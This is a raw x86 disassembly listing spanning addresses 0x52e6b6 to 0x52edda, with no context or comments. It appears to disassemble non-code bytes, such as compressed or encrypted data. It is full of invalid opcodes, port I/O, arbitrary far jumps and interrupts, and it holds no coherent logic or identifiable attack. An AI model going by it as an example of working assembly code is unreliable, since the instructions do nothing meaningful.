  52e6b6:	ror    dh,1
  52e6b8:	in     eax,0xd4
  52e6ba:	jl     0x52e692
  52e6bc:	mov    esp,0xce99a195
  52e6c1:	dec    ecx
  52e6c2:	adc    BYTE PTR [ecx-0x19],ah
  52e6c5:	pop    ecx
  52e6c6:	pop    ebp
  52e6c7:	adc    DWORD PTR ds:0xde030b49,edi
  52e6cd:	pop    ebx
  52e6ce:	mov    ebx,eax
  52e6d0:	pop    esp
  52e6d1:	xlat   BYTE PTR ds:[ebx]
  52e6d2:	jns    0x52e6ca
  52e6d4:	mov    bl,0xdb
  52e6d6:	mov    esi,ecx
  52e6d8:	xchg   ebx,eax
  52e6d9:	adc    eax,0xd1d619fd
  52e6de:	fsub   DWORD PTR [esi-0x4802bbba]
  52e6e4:	push   0x80816a45
  52e6e9:	push   edi
  52e6ea:	pop    esi
  52e6eb:	jle    0x52e6d5
  52e6ed:	je     0x52e6a1
  52e6ef:	push   cs
  52e6f0:	sub    DWORD PTR [ecx+0x7c],edx
  52e6f3:	cmp    ebp,DWORD PTR [eax-0x5b68e9b3]
  52e6f9:	sahf   
  52e6fa:	pop    edi
  52e6fb:	jmp    0xc94a:0x2398a0cd
  52e702:	and    ecx,DWORD PTR [ecx-0x58]
  52e705:	nop
  52e706:	cdq    
  52e707:	out    0x60,al
  52e709:	xchg   ebp,eax
  52e70a:	adc    BYTE PTR [esi+0x23],dl
  52e70d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52e70e:	add    ebp,ebx
  52e710:	mov    esi,0xbf871721
  52e715:	jno    0x52e71e
  52e717:	in     al,0x81
  52e719:	xchg   ebp,eax
  52e71a:	jg     0x52e6c3
  52e71c:	outs   dx,BYTE PTR ds:[esi]
  52e71d:	lods   eax,DWORD PTR ds:[esi]
  52e71e:	jne    0x52e6f6
  52e720:	inc    eax
  52e721:	dec    ebp
  52e722:	and    eax,0xa9230a85
  52e727:	adc    dl,ah
  52e729:	mov    edx,0xac91c3e7
  52e72e:	mov    eax,0x6e25530e
  52e733:	test   eax,0x4b6b9f67
  52e738:	pop    edi
  52e739:	sti    
  52e73a:	mov    ds:0xe4c19c69,al
  52e73f:	test   eax,0xcd94024e
  52e744:	ficomp DWORD PTR [edx]
  52e746:	push   0xfb20e763
  52e74b:	pop    edx
  52e74c:	add    al,0x3d
  52e74e:	in     eax,dx
  52e74f:	xlat   BYTE PTR ds:[ebx]
  52e750:	icebp  
  52e751:	iret   
  52e752:	ficom  WORD PTR [edi+0x3e90faf9]
  52e758:	je     0x52e72f
  52e75a:	jmp    0x123b:0xad39fc5e
  52e761:	add    bl,bl
  52e763:	outs   dx,DWORD PTR ds:[esi]
  52e764:	push   edx
  52e765:	int    0x33
  52e767:	imul   ebp,DWORD PTR [edi],0x48
  52e76a:	pop    esi
  52e76b:	repnz stos BYTE PTR es:[edi],al
  52e76d:	fsub   QWORD PTR [ecx]
  52e76f:	mov    dh,BYTE PTR [ebx+eax*1]
  52e772:	push   edx
  52e773:	aas    
  52e774:	neg    BYTE PTR [ebx-0xd153c83]
  52e77a:	pop    ebp
  52e77b:	pop    esi
  52e77c:	scas   al,BYTE PTR es:[edi]
  52e77d:	js     0x52e76a
  52e77f:	inc    esp
  52e780:	sub    ebp,DWORD PTR [eax-0x4663b926]
  52e786:	and    al,0x93
  52e788:	inc    esi
  52e789:	je     0x52e794
  52e78b:	inc    eax
  52e78c:	cli    
  52e78d:	mov    ebx,0x9f74e110
  52e792:	sahf   
  52e793:	(bad)  
  52e794:	and    ch,bl
  52e796:	hlt    
  52e797:	or     al,dh
  52e799:	mov    WORD PTR [esi],ds
  52e79b:	push   ebp
  52e79c:	mov    ebp,0x80cf11ba
  52e7a1:	cmp    eax,0xe75fb2de
  52e7a6:	xor    BYTE PTR [esp+edi*4-0x669f84bd],bh
  52e7ad:	adc    al,0xa0
  52e7af:	push   esp
  52e7b0:	sti    
  52e7b1:	retf   0x1d29
  52e7b4:	sbb    ebx,DWORD PTR [ebx+0x432650e1]
  52e7ba:	sahf   
  52e7bb:	int3   
  52e7bc:	pushf  
  52e7bd:	mov    ch,0x2a
  52e7bf:	xor    BYTE PTR [ebx-0x72179f91],cl
  52e7c5:	cmp    dh,BYTE PTR [edi]
  52e7c7:	adc    DWORD PTR [esi],eax
  52e7c9:	mov    eax,ds:0x6c00d874
  52e7ce:	nop
  52e7cf:	shl    DWORD PTR [eax-0x5],0xd7
  52e7d3:	out    dx,al
  52e7d4:	sbb    DWORD PTR [eax+0x9],esp
  52e7d7:	xchg   ecx,eax
  52e7d8:	xor    eax,0xa7229d10
  52e7dd:	sbb    esp,DWORD PTR [edi+eiz*1]
  52e7e0:	adc    ebx,eax
  52e7e2:	inc    edi
  52e7e3:	jnp    0x52e7db
  52e7e5:	(bad)  
  52e7e6:	imul   DWORD PTR [esi]
  52e7e8:	push   eax
  52e7e9:	mov    ch,BYTE PTR [esi]
  52e7eb:	out    0xb5,eax
  52e7ed:	shl    esi,1
  52e7ef:	mov    dl,BYTE PTR [eax-0x73]
  52e7f2:	add    cl,BYTE PTR [edx-0x61]
  52e7f5:	out    0x95,eax
  52e7f7:	xor    dl,ch
  52e7f9:	adc    eax,0xe79f10b9
  52e7fe:	test   DWORD PTR [edi-0x1fdba449],0xfdc2f273
  52e808:	retf   
  52e809:	xchg   edi,eax
  52e80a:	mov    al,0x71
  52e80c:	mov    ah,0x7d
  52e80e:	pop    edi
  52e80f:	clc    
  52e810:	pop    eax
  52e811:	adc    esp,ecx
  52e813:	mov    edx,0xe41d3e0
  52e818:	pop    eax
  52e819:	(bad)  [edx+0x62]
  52e81c:	and    esp,DWORD PTR [edx+0x77]
  52e81f:	call   0xc2a7:0x67d1226b
  52e826:	(bad)  
  52e827:	pop    ebp
  52e828:	sub    ebx,edi
  52e82a:	or     DWORD PTR [esi+0x14c72972],edi
  52e830:	push   ecx
  52e831:	and    esp,ebx
  52e833:	mov    al,0x72
  52e835:	je     0x52e863
  52e837:	test   al,0x69
  52e839:	or     eax,0x4661e181
  52e83e:	pop    edi
  52e83f:	arpl   WORD PTR [esp+ecx*8+0x5f94e939],ax
  52e846:	call   0x846a:0x38dc46ea
  52e84d:	jmp    0x57e1:0xc1567b6c
  52e854:	jge    0x52e824
  52e856:	scas   eax,DWORD PTR es:[edi]
  52e857:	add    bh,bh
  52e859:	xchg   esp,eax
  52e85a:	cmp    BYTE PTR [eax],dh
  52e85c:	mov    bh,0x3b
  52e85e:	fdivr  st,st(5)
  52e860:	mov    ds:0xa1eec6f9,eax
  52e865:	cwde   
  52e866:	aas    
  52e867:	(bad)  
  52e869:	rcl    esp,0x2a
  52e86c:	nop
  52e86d:	xchg   esp,eax
  52e86e:	push   edi
  52e86f:	push   es
  52e870:	ror    esi,0xdd
  52e873:	out    0x70,al
  52e875:	adc    dl,ah
  52e877:	leave  
  52e878:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52e879:	js     0xbccbb97b
  52e87f:	push   ebp
  52e880:	lea    eax,[eax+ebx*1]
  52e883:	xor    cl,0x60
  52e886:	pusha  
  52e887:	call   0x474d:0xe5d1ea6b
  52e88e:	fisub  DWORD PTR [edx]
  52e890:	clc    
  52e891:	in     eax,dx
  52e892:	and    eax,DWORD PTR [eax-0x37]
  52e895:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52e896:	aam    0xf7
  52e898:	call   0xeeb2:0x1421c282
  52e89f:	out    dx,eax
  52e8a0:	mov    al,ds:0xe60eff22
  52e8a5:	ret    0xb682
  52e8a8:	outs   dx,DWORD PTR ds:[esi]
  52e8a9:	lods   al,BYTE PTR ds:[esi]
  52e8aa:	repz jae 0x52e8a7
  52e8ad:	loopne 0x52e905
  52e8af:	test   edx,esp
  52e8b1:	and    eax,0xabfa975a
  52e8b6:	lods   eax,DWORD PTR ds:[esi]
  52e8b7:	call   0xe77dcce7
  52e8bc:	xlat   BYTE PTR ds:[ebx]
  52e8bd:	jbe    0x52e92f
  52e8bf:	pusha  
  52e8c0:	sbb    DWORD PTR [ebp+0x1c],edx
  52e8c3:	mov    eax,ds:0x7d5afd99
  52e8c8:	add    BYTE PTR [ebx],al
  52e8ca:	adc    BYTE PTR [esi-0x14],ah
  52e8cd:	arpl   bx,ax
  52e8cf:	adc    ah,BYTE PTR [eax+0x5]
  52e8d2:	sub    al,0xca
  52e8d4:	xchg   BYTE PTR [ecx+0x4c],dh
  52e8d7:	inc    edx
  52e8d8:	sbb    DWORD PTR [ebp-0x59],eax
  52e8db:	ds sub ebx,ebp
  52e8de:	pusha  
  52e8df:	dec    esi
  52e8e0:	xchg   esp,eax
  52e8e1:	vpunpcklwd xmm7,xmm1,xmm4
  52e8e5:	or     esp,edx
  52e8e7:	setg   BYTE PTR [ecx+0x40]
  52e8eb:	mov    edi,0xf76a497c
  52e8f0:	loop   0x52e8bb
  52e8f2:	fld    QWORD PTR [ebp+0x12]
  52e8f5:	into   
  52e8f6:	jmp    0x9df5:0x8331d57f
  52e8fd:	add    al,0xfa
  52e8ff:	jno    0x52e8c1
  52e901:	scas   al,BYTE PTR es:[edi]
  52e902:	sbb    esp,esp
  52e904:	imul   esp,ebx,0x429d16fa
  52e90a:	add    DWORD PTR [edx],edi
  52e90c:	adc    BYTE PTR [ecx],bl
  52e90e:	xchg   ebp,eax
  52e90f:	xchg   ebx,eax
  52e910:	mov    eax,DWORD PTR [ebp+0x47a8a891]
  52e916:	and    ebx,DWORD PTR [eiz*2-0x38dfc494]
  52e91d:	aam    0xaf
  52e91f:	retf   
  52e920:	sub    eax,0x56351771
  52e925:	std    
  52e926:	mov    esp,0x2ad6000f
  52e92b:	adc    eax,0x597885fd
  52e930:	sub    dh,bh
  52e932:	or     ecx,ebx
  52e934:	cmp    eax,0x397daac4
  52e939:	pushf  
  52e93a:	cdq    
  52e93b:	shl    BYTE PTR [eax],1
  52e93d:	fdivr  st(4),st
  52e93f:	jmp    0x2939f474
  52e944:	sti    
  52e945:	(bad)  
  52e946:	ja     0x52e9c0
  52e948:	mov    ebp,ebp
  52e94a:	dec    eax
  52e94b:	mov    bh,0x86
  52e94d:	xchg   ebp,eax
  52e94e:	dec    ebx
  52e94f:	repnz push edx
  52e951:	and    dl,al
  52e953:	xor    esi,edi
  52e955:	add    BYTE PTR [esi+0x4e601008],bh
  52e95b:	push   edi
  52e95c:	dec    ecx
  52e95d:	lds    esp,FWORD PTR [ebx-0x37fda17f]
  52e963:	jae    0x52e941
  52e965:	xlat   BYTE PTR ds:[ebx]
  52e966:	mov    dl,0x14
  52e968:	sahf   
  52e969:	lds    edi,FWORD PTR [edi+0x69]
  52e96c:	pop    eax
  52e96d:	jae    0x52e95d
  52e96f:	sbb    edi,ecx
  52e971:	sti    
  52e972:	jge    0x52e9e8
  52e974:	mov    eax,ds:0x5805a151
  52e979:	rol    DWORD PTR [esp+esi*1+0x52],cl
  52e97d:	mov    eax,ds:0x4de8aef5
  52e982:	or     al,0x12
  52e984:	cs pushf 
  52e986:	cmp    eax,DWORD PTR [edi-0x782c88af]
  52e98c:	jbe    0x52e9df
  52e98e:	stos   BYTE PTR es:[edi],al
  52e98f:	jns    0x52e9cb
  52e991:	mov    ch,0xcc
  52e993:	scas   al,BYTE PTR es:[edi]
  52e994:	nop
  52e995:	push   eax
  52e996:	(bad)  
  52e997:	lods   eax,DWORD PTR ds:[esi]
  52e998:	adc    ah,ch
  52e99a:	and    ebp,DWORD PTR [edx+0x3c96696b]
  52e9a0:	das    
  52e9a1:	(bad)  
  52e9a2:	dec    esp
  52e9a3:	stos   BYTE PTR es:[edi],al
  52e9a4:	das    
  52e9a5:	mov    ds:0x3fc4ad0,al
  52e9aa:	nop
  52e9ab:	ss ret 0x166a
  52e9af:	xor    BYTE PTR [ecx],0x6f
  52e9b2:	sbb    DWORD PTR [esi],ecx
  52e9b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52e9b5:	mov    dl,0x1
  52e9b7:	sub    BYTE PTR [ebp+0x5a],bl
  52e9ba:	dec    ebx
  52e9bb:	mov    es,esi
  52e9bd:	and    ebx,DWORD PTR [ebp-0x184a95ca]
  52e9c3:	xchg   ebx,eax
  52e9c4:	fist   WORD PTR [ebx+eiz*2]
  52e9c7:	jbe    0x52e959
  52e9c9:	add    DWORD PTR [edi],0x607fd0cc
  52e9cf:	push   0xae637ff8
  52e9d4:	lods   eax,DWORD PTR ds:[esi]
  52e9d5:	sub    al,0x66
  52e9d7:	dec    ebp
  52e9d8:	push   es
  52e9d9:	int    0x49
  52e9db:	jmp    DWORD PTR [esi+0x5cb2a7db]
  52e9e1:	loopne 0x52e97d
  52e9e3:	ja     0x52e9b4
  52e9e5:	sbb    BYTE PTR [ecx+0x7],cl
  52e9e8:	xor    DWORD PTR [ebp-0x31],eax
  52e9eb:	push   es
  52e9ec:	xlat   BYTE PTR ds:[ebx]
  52e9ed:	dec    edx
  52e9ee:	inc    edx
  52e9ef:	mov    bh,BYTE PTR [eax]
  52e9f1:	inc    ecx
  52e9f2:	mov    ah,0xfd
  52e9f4:	sub    DWORD PTR [ebx],ecx
  52e9f6:	mov    bl,0x0
  52e9f8:	inc    ebx
  52e9f9:	pop    ecx
  52e9fa:	mov    ch,BYTE PTR [ebp+0x573c68a4]
  52ea00:	inc    esi
  52ea01:	dec    esp
  52ea02:	xor    DWORD PTR [ebx-0x1b],esi
  52ea05:	cmp    al,0x67
  52ea07:	add    BYTE PTR [esi+0x1ddd97ce],cl
  52ea0d:	or     eax,0x8775f408
  52ea12:	push   ebp
  52ea13:	ret    0x9724
  52ea16:	test   BYTE PTR [ebx],ch
  52ea18:	lock arpl WORD PTR [ecx+0x63],bx
  52ea1c:	cld    
  52ea1d:	stos   BYTE PTR es:[edi],al
  52ea1e:	jp     0x52ea39
  52ea20:	add    eax,0x1d68a332
  52ea25:	jae    0x52ea91
  52ea27:	add    al,0x7a
  52ea29:	jno    0x52ea7e
  52ea2b:	ds addr16 (bad) 
  52ea2e:	mov    eax,ds:0x49b19ff5
  52ea33:	xor    dh,BYTE PTR [edi]
  52ea35:	mov    bh,0x56
  52ea37:	in     al,0xe0
  52ea39:	in     al,dx
  52ea3a:	data16 fistp QWORD PTR [esi-0x2e2d0a48]
  52ea41:	scas   al,BYTE PTR es:[edi]
  52ea42:	lods   al,BYTE PTR ds:[esi]
  52ea43:	int    0x8a
  52ea45:	mov    dl,0x20
  52ea47:	ss out dx,eax
  52ea49:	push   ebx
  52ea4a:	cli    
  52ea4b:	xor    ch,bh
  52ea4d:	in     eax,0x39
  52ea4f:	mov    bl,0x7b
  52ea51:	pop    ds
  52ea52:	mov    ds:0xa0834daa,eax
  52ea57:	mov    cl,0x90
  52ea59:	sbb    BYTE PTR [ebp-0x4d],dl
  52ea5c:	int3   
  52ea5d:	ins    BYTE PTR es:[edi],dx
  52ea5e:	adc    al,0x0
  52ea60:	cmp    edx,DWORD PTR [ebp+eiz*8+0xd739212]
  52ea67:	sbb    eax,0x2fb83d3d
  52ea6c:	fdiv   QWORD PTR [edi+0x4e7b620e]
  52ea72:	sar    DWORD PTR [ecx-0x3c646a09],0x14
  52ea79:	mov    ah,0xa5
  52ea7b:	ror    BYTE PTR [edi-0x51],cl
  52ea7e:	test   al,0x4f
  52ea80:	pusha  
  52ea81:	or     ah,BYTE PTR [ecx+0x1a]
  52ea84:	mov    ds:0xc8397838,eax
  52ea89:	call   0x22af:0x70c13aa9
  52ea90:	adc    BYTE PTR [esi-0xc1ae96a],al
  52ea96:	and    BYTE PTR [ebx-0x2b053bd8],dh
  52ea9c:	test   bh,dl
  52ea9e:	bound  eax,QWORD PTR [edx+0x73ae6a67]
  52eaa4:	aaa    
  52eaa5:	sub    ebx,DWORD PTR [ebx+0x4f]
  52eaa8:	mov    ebp,0xb87774e
  52eaad:	enter  0xb68f,0xc7
  52eab1:	loop   0x52eadc
  52eab3:	sar    BYTE PTR [ecx+ecx*2],0x47
  52eab7:	pop    es
  52eab8:	jb     0x52ea72
  52eaba:	or     DWORD PTR [edi+0x1a48a599],ecx
  52eac0:	jge    0x52eac2
  52eac2:	jo     0x52ead6
  52eac4:	sbb    BYTE PTR [ecx+ebx*1+0x3786fe3c],al
  52eacb:	shr    DWORD PTR [eax+0x42108e70],0xfb
  52ead2:	mov    bl,0x4f
  52ead4:	js     0x52ea99
  52ead6:	jle    0x52ea70
  52ead8:	mov    bl,0xc2
  52eada:	fnsave [edi+eax*8]
  52eadd:	jecxz  0x52ea8c
  52eadf:	inc    eax
  52eae0:	jnp    0x52eb4c
  52eae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52eae3:	cmp    eax,ecx
  52eae5:	les    eax,FWORD PTR [eax+0x17]
  52eae8:	ins    BYTE PTR es:[edi],dx
  52eae9:	enter  0x5d36,0x8d
  52eaed:	cmp    eax,0x8843881f
  52eaf2:	adc    ch,bh
  52eaf4:	fild   DWORD PTR [edx+0x52]
  52eaf7:	pop    ebx
  52eaf8:	shr    DWORD PTR [ecx+ebx*1-0x34f5520d],0xca
  52eb00:	mov    DWORD PTR [eax-0x2c3deaf4],edx
  52eb06:	scas   eax,DWORD PTR es:[edi]
  52eb07:	dec    edx
  52eb08:	aam    0x6c
  52eb0a:	adc    ah,BYTE PTR [ebx]
  52eb0c:	rol    DWORD PTR [eax-0xac4ad38],0x86
  52eb13:	dec    ebp
  52eb14:	mov    esi,0x16b8604e
  52eb19:	shr    DWORD PTR [edi],cl
  52eb1b:	adc    cl,BYTE PTR [ecx]
  52eb1d:	sbb    eax,0x750bde63
  52eb22:	push   ds
  52eb23:	adc    ecx,DWORD PTR [edx]
  52eb25:	(bad)  
  52eb27:	push   es
  52eb28:	ins    DWORD PTR es:[edi],dx
  52eb29:	xchg   ebp,eax
  52eb2a:	loopne 0x52eacb
  52eb2c:	call   ebx
  52eb2e:	and    edx,DWORD PTR [esi-0x38]
  52eb31:	mov    cl,0x3b
  52eb33:	cmp    al,0xa3
  52eb35:	mov    ecx,0x414b393f
  52eb3a:	inc    edx
  52eb3b:	cs out 0x26,al
  52eb3e:	mov    esp,0x7dc3829e
  52eb43:	cmp    DWORD PTR [ebx+0x31e93a36],0x21
  52eb4a:	inc    ecx
  52eb4b:	cs push ss
  52eb4d:	pop    ss
  52eb4e:	push   edx
  52eb4f:	adc    ecx,DWORD PTR [ebx+edi*8+0x18]
  52eb53:	cli    
  52eb54:	and    ebx,DWORD PTR [edx+0x5a]
  52eb57:	inc    edx
  52eb58:	cdq    
  52eb59:	mov    bl,0xa5
  52eb5b:	pop    eax
  52eb5c:	stc    
  52eb5d:	enter  0x28a7,0xce
  52eb61:	adc    al,0xff
  52eb63:	fmul   st,st(2)
  52eb65:	adc    al,0x2a
  52eb67:	ins    DWORD PTR es:[edi],dx
  52eb68:	ins    DWORD PTR es:[edi],dx
  52eb69:	aam    0xf1
  52eb6b:	xchg   DWORD PTR [edx],esp
  52eb6d:	lods   eax,DWORD PTR ds:[esi]
  52eb6e:	mov    ecx,0xbe1899b9
  52eb73:	pop    esi
  52eb74:	popf   
  52eb75:	retf   0x4991
  52eb78:	push   edx
  52eb79:	out    0xde,eax
  52eb7b:	mov    ebp,0xc1e15c39
  52eb80:	xor    DWORD PTR [ebx+0x3e],edi
  52eb83:	lods   eax,DWORD PTR ds:[esi]
  52eb84:	shl    bl,0x89
  52eb87:	aad    0xdb
  52eb89:	mov    bl,0x5a
  52eb8b:	push   edi
  52eb8c:	into   
  52eb8d:	test   al,0x4c
  52eb8f:	fdiv   st,st(7)
  52eb91:	arpl   WORD PTR [edi-0x773a403a],di
  52eb97:	pop    ds
  52eb98:	fwait
  52eb99:	addr16 jp 0x52eb9b
  52eb9c:	or     al,0x50
  52eb9e:	sbb    dh,dl
  52eba0:	test   BYTE PTR [ebx],ch
  52eba2:	cmp    dl,BYTE PTR [ebx]
  52eba4:	push   ebp
  52eba5:	pop    esp
  52eba6:	int    0xd9
  52eba8:	jecxz  0x52eb68
  52ebaa:	jle    0x52eb5f
  52ebac:	aad    0xe
  52ebae:	adc    al,0x4c
  52ebb0:	sbb    eax,0xbbb793b9
  52ebb5:	sub    eax,0xaae6707d
  52ebba:	enter  0x8e3a,0x39
  52ebbe:	icebp  
  52ebbf:	mov    edi,0x4cc2e925
  52ebc4:	aas    
  52ebc5:	lea    eax,[eax]
  52ebc7:	cmp    esp,DWORD PTR [edi]
  52ebc9:	dec    ebx
  52ebca:	add    ebp,ecx
  52ebcc:	ret    
  52ebcd:	cmp    edi,ebp
  52ebcf:	ficom  WORD PTR [edx]
  52ebd1:	and    bl,0x47
  52ebd4:	xlat   BYTE PTR ds:[ebx]
  52ebd5:	or     ebx,0xaa8b8ae9
  52ebdb:	xor    DWORD PTR [ebp-0x23886ca],ebp
  52ebe1:	popa   
  52ebe2:	cmp    al,0xdd
  52ebe4:	xlat   BYTE PTR ds:[ebx]
  52ebe5:	xchg   ebp,eax
  52ebe6:	loopne 0x52ec4e
  52ebe8:	dec    ebp
  52ebe9:	mov    bh,dh
  52ebeb:	or     al,0x4c
  52ebed:	sub    edi,DWORD PTR [ecx]
  52ebef:	sub    al,0x38
  52ebf1:	sbb    al,0x71
  52ebf3:	pop    eax
  52ebf4:	jle    0x52ec01
  52ebf6:	(bad)  
  52ebf7:	fbld   TBYTE PTR [esi+0x3d]
  52ebfa:	int    0x7c
  52ebfc:	mov    bl,0x4f
  52ebfe:	bound  ebp,QWORD PTR [edx+ebp*4-0x5d]
  52ec02:	leave  
  52ec03:	stc    
  52ec04:	add    eax,ecx
  52ec06:	and    al,0xe3
  52ec08:	cmp    cl,ch
  52ec0a:	cmp    esi,0xffffffb0
  52ec0d:	mov    ds:0x6f26c46a,eax
  52ec12:	das    
  52ec13:	push   esp
  52ec14:	sbb    ah,BYTE PTR [eax]
  52ec16:	add    al,0x50
  52ec18:	mov    bl,0xd0
  52ec1a:	in     al,dx
  52ec1b:	sub    al,0x74
  52ec1d:	out    dx,eax
  52ec1e:	loop   0x52ec05
  52ec20:	adc    DWORD PTR [edi-0x5c],ecx
  52ec23:	pop    ecx
  52ec24:	mov    BYTE PTR [edi],dh
  52ec26:	add    BYTE PTR [edx+edx*8],bh
  52ec29:	cwde   
  52ec2a:	rcl    BYTE PTR [esi-0x49],cl
  52ec2d:	adc    ch,BYTE PTR [ecx+eiz*8-0x6de2518b]
  52ec34:	les    esp,FWORD PTR [ecx]
  52ec36:	cmp    eax,0xc581b4ca
  52ec3b:	and    DWORD PTR [edi-0x43],edx
  52ec3e:	push   0x48
  52ec40:	mov    dl,BYTE PTR [ecx]
  52ec42:	xor    cl,ah
  52ec44:	push   esi
  52ec45:	pop    esi
  52ec46:	pop    ds
  52ec47:	jecxz  0x52ecae
  52ec49:	pop    edi
  52ec4a:	jmp    0x52ec06
  52ec4c:	ret    
  52ec4d:	and    DWORD PTR [ebx],ebp
  52ec4f:	das    
  52ec50:	in     eax,0xf3
  52ec52:	sbb    dh,BYTE PTR [eax]
  52ec54:	ror    ah,1
  52ec56:	ret    0x329b
  52ec59:	aam    0x1b
  52ec5b:	dec    eax
  52ec5c:	hlt    
  52ec5d:	push   ebp
  52ec5e:	imul   eax,DWORD PTR [edi+0x7],0xde172143
  52ec65:	xchg   ecx,eax
  52ec66:	inc    eax
  52ec67:	push   ecx
  52ec68:	fst    QWORD PTR [ebp+0x58]
  52ec6b:	(bad)  
  52ec6d:	lahf   
  52ec6e:	mov    al,0x75
  52ec70:	pop    edi
  52ec71:	mov    ecx,0xdffe12f9
  52ec76:	cmp    al,0xff
  52ec78:	sub    BYTE PTR [eax+0x17b9017b],bl
  52ec7e:	lods   eax,DWORD PTR ds:[esi]
  52ec7f:	push   0x5630c301
  52ec84:	out    dx,al
  52ec85:	push   ss
  52ec86:	push   ss
  52ec87:	mov    eax,0x560c5f08
  52ec8c:	jmp    0x52ed05
  52ec8e:	mov    eax,0x7786cc2d
  52ec93:	mov    esi,0x6b2ec0a7
  52ec98:	adc    al,0xb
  52ec9a:	in     eax,0xee
  52ec9c:	into   
  52ec9d:	xchg   edx,eax
  52ec9e:	inc    esi
  52ec9f:	adc    al,0xd3
  52eca1:	jno    0x52ecb6
  52eca3:	sahf   
  52eca4:	rol    DWORD PTR [eax+0xf99f753],0x4c
  52ecab:	cmp    DWORD PTR [edx+0x277a83b2],eax
  52ecb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52ecb2:	adc    eax,eax
  52ecb4:	jnp    0x52ece8
  52ecb6:	xor    DWORD PTR [ecx+ebx*1-0x32],eax
  52ecba:	rcl    DWORD PTR [edi],0xf0
  52ecbd:	xchg   dh,al
  52ecbf:	shl    DWORD PTR [esi-0x477e9c41],0x18
  52ecc6:	gs xor ebx,esi
  52ecc9:	sbb    eax,0x9b04b2c9
  52ecce:	or     dh,BYTE PTR [ecx+0x42203d2d]
  52ecd4:	imul   esp,DWORD PTR [edx],0xffffffdd
  52ecd7:	and    DWORD PTR [eax+0x50],edx
  52ecda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52ecdb:	xor    ecx,DWORD PTR [ebp+0x513b7768]
  52ece1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52ece2:	push   cs
  52ece3:	jns    0x52ecb3
  52ece5:	test   BYTE PTR [ebp-0x4f],bl
  52ece8:	sbb    DWORD PTR [eax+ebx*8],esp
  52eceb:	mov    ch,0x90
  52eced:	imul   edx,DWORD PTR [esi+0x61],0x28
  52ecf1:	push   ecx
  52ecf2:	and    al,0xe9
  52ecf4:	jmp    0xd5916b1
  52ecf9:	inc    sp
  52ecfb:	jp     0x52ecfc
  52ecfd:	dec    eax
  52ecfe:	add    ebx,eax
  52ed00:	jecxz  0x52ecaa
  52ed02:	(bad)  
  52ed03:	sub    eax,0xb674572
  52ed08:	fcmovnbe st,st(5)
  52ed0a:	jo     0x52ed20
  52ed0c:	stos   BYTE PTR es:[edi],al
  52ed0d:	jae    0x52ecfb
  52ed0f:	leave  
  52ed10:	popa   
  52ed11:	jns    0x52ec9b
  52ed13:	fistp  QWORD PTR [ebx-0x6553153d]
  52ed19:	jo     0x52ecad
  52ed1b:	xlat   BYTE PTR ds:[ebx]
  52ed1c:	dec    esi
  52ed1d:	(bad)  
  52ed1e:	in     al,dx
  52ed1f:	(bad)  [ebp-0x38]
  52ed22:	ja     0x52ed3e
  52ed24:	mov    eax,ds:0xb5da0924
  52ed29:	and    ah,BYTE PTR [edi-0x13]
  52ed2c:	jae    0x52ecd4
  52ed2e:	or     eax,edx
  52ed30:	and    dl,BYTE PTR [ebx-0x3bd22e23]
  52ed36:	leave  
  52ed37:	cdq    
  52ed38:	mov    eax,0x6afe4b05
  52ed3d:	pop    ds
  52ed3e:	adc    BYTE PTR [ebx-0x2a1ddf11],dh
  52ed44:	xlat   BYTE PTR ds:[ebx]
  52ed45:	shl    BYTE PTR [ebx],cl
  52ed47:	add    ch,BYTE PTR [edx+0x53]
  52ed4a:	scas   al,BYTE PTR es:[edi]
  52ed4b:	xchg   esi,eax
  52ed4c:	xchg   BYTE PTR [edx],bl
  52ed4e:	leave  
  52ed4f:	ror    DWORD PTR [edi],1
  52ed51:	push   ecx
  52ed52:	cmp    esp,esi
  52ed54:	adc    al,0x6d
  52ed56:	pop    esi
  52ed57:	jmp    0xf7071f6b
  52ed5c:	int    0xdb
  52ed5e:	dec    BYTE PTR [ebp-0x42008828]
  52ed64:	sub    al,0xae
  52ed66:	push   edi
  52ed67:	clc    
  52ed68:	inc    esi
  52ed69:	in     al,0x69
  52ed6b:	mov    eax,ds:0x2bd4069d
  52ed70:	es aas 
  52ed72:	mov    bh,BYTE PTR [ebp-0x22]
  52ed75:	cmp    esi,ebx
  52ed77:	sub    BYTE PTR [eax+eiz*2-0x2c],ah
  52ed7b:	jae    0x52ed10
  52ed7d:	pop    ebp
  52ed7e:	ret    0x2fb9
  52ed81:	xchg   ebx,eax
  52ed82:	pop    ss
  52ed83:	pop    esp
  52ed84:	(bad)
  52ed87:	sub    al,0x71
  52ed89:	push   esi
  52ed8a:	inc    ebp
  52ed8b:	cmc    
  52ed8c:	pop    ss
  52ed8d:	dec    ebx
  52ed8e:	test   eax,0x4f44af2e
  52ed93:	mov    dh,BYTE PTR [edx+0x8]
  52ed96:	and    DWORD PTR [eax+0x354cb360],0x2
  52ed9d:	xchg   edi,eax
  52ed9e:	ret    0x7707
  52eda1:	ret    
  52eda2:	cmc    
  52eda3:	inc    ecx
  52eda4:	popa   
  52eda5:	add    ebx,DWORD PTR [esi]
  52eda7:	outs   dx,DWORD PTR ds:[esi]
  52eda8:	shl    bl,1
  52edaa:	scas   al,BYTE PTR es:[edi]
  52edab:	inc    ebp
  52edac:	mov    bh,0x8d
  52edae:	stos   DWORD PTR es:[edi],eax
  52edaf:	lods   al,BYTE PTR ds:[esi]
  52edb0:	loopne 0x52edd5
  52edb2:	xchg   DWORD PTR [eax],eax
  52edb4:	mov    bl,0x4c
  52edb6:	cmp    al,0x3c
  52edb8:	stos   DWORD PTR es:[edi],eax
  52edb9:	mov    DWORD PTR [ebx],ebp
  52edbb:	clc    
  52edbc:	int3   
  52edbd:	test   eax,0x3de9fb1c
  52edc2:	adc    ch,BYTE PTR [edi+eiz*4-0x31f22c06]
  52edc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52edca:	sub    al,0x6e
  52edcc:	test   al,0x59
  52edce:	rcl    bl,cl
  52edd0:	jb     0x52ee10
  52edd2:	test   DWORD PTR es:[ebp+0x62],ebx
  52edd6:	and    cl,BYTE PTR [ebx]
  52edd8:	cmp    al,0xfb
  52edda:	sbb    ebx,DWORD PTR [edx]
